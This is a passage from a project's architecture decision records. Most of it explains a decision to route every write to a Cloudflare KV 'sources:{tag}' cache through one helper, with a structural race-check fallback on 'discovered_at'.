- Astro upgrades that change the wrapper's middleware composition (Astro 6's session-driver factory is the active example) require a Playwright run before merge to confirm middleware still fires.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-security-headers-on-every-response)

---

### AD16: Single-writer invariant for KV `sources:{tag}` enforced via centralised helper

**Status:** Accepted (2026-05-04)

**Decision:** Every write to `sources:{tag}` KV entries goes through `writeSourcesCache` in `src/lib/sources-cache.ts`. The helper canonicalises serialisation (explicit field order: `feeds` then `discovered_at`). The coordinator's eviction read-modify-write recheck uses the helper's `sourcesCacheRawEqual` companion: byte-equal on the fast path, with a STRUCTURAL fallback that compares the parsed `discovered_at` field so a serialisation drift cannot false-positive the race detection.

**Context:** The eviction pass in `applyEvictions` reads `sources:{tag}`, computes a surviving-feeds list, then re-reads the key right before writing to detect a concurrent discovery-cron write. KV has no conditional-put, so the recheck is the only race guard. Before this ADR, the recheck was a raw `latestRaw === raw` byte compare — correct ONLY because the two existing writers (`discovery.ts` success path, `discovery.ts` give-up path, and the coordinator's eviction path) all coincidentally serialised the same `{ feeds, discovered_at }` shape with the same field order via inline `JSON.stringify(...)`. A future writer using a different shape (different field order, additional fields, alternative codec) would have silently clobbered legitimate concurrent writes the recheck was meant to prevent. Same anti-pattern AD7 explicitly migrated away from for chunk-completion tracking.

**Alternatives considered:**

- **Move `sources:{tag}` to D1.** D1's conditional UPDATE+WHERE makes read-modify-write atomic by construction (the AD7 path). Stronger guarantee but a meaningful schema migration; the eviction path is bounded write volume (a few hundred tags × every-4-hour cron) so KV's eventual consistency is acceptable here. Defer; revisit if write volume grows.
- **Per-write monotonic version counter (CAS-style).** Same effect as the structural recheck on `discovered_at` since `discovered_at` is monotonically generated by `Date.now()` at write time. Adding a separate version column would duplicate that monotonic signal. Rejected.
- **Trust the comment** ("byte-equal compare valid because JSON.stringify is sole writer"). This is what the previous code did. Reviewer churn confirmed comments don't enforce invariants — the invariant is one careless PR away from breaking.

**Rationale:** Centralising the writer is the cheapest way to make the invariant load-bearing instead of comment-bearing. The structural fallback is belt-and-suspenders: even if a future writer routes around the helper (or a future helper change introduces a serialisation drift), the eviction recheck still catches the race because `discovered_at` is the actual signal of "this is a different write".

**Consequences:**

- New code touching `sources:{tag}` MUST use `writeSourcesCache`. A direct `KV.put('sources:...', ...)` call is a code-review reject.
- The helper exposes a `readSourcesCache` companion with matching shape validation; reading paths should migrate as they're touched (no big-bang rewrite — too much surface, too little risk reduction).
- If the cache value shape ever needs to gain a field, both the helper's `serialize()` field order AND `sourcesCacheRawEqual`'s parse path update in lockstep. The structural recheck's reliance on `discovered_at` is documented inline.
- Future `sources:{tag}` migration to D1 supersedes this ADR. Until then, this is the contract.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

## Related Documentation

- [Architecture](../architecture.md) — System overview and component map
- [Configuration](../configuration.md) — Env vars, bindings, KV key conventions

---
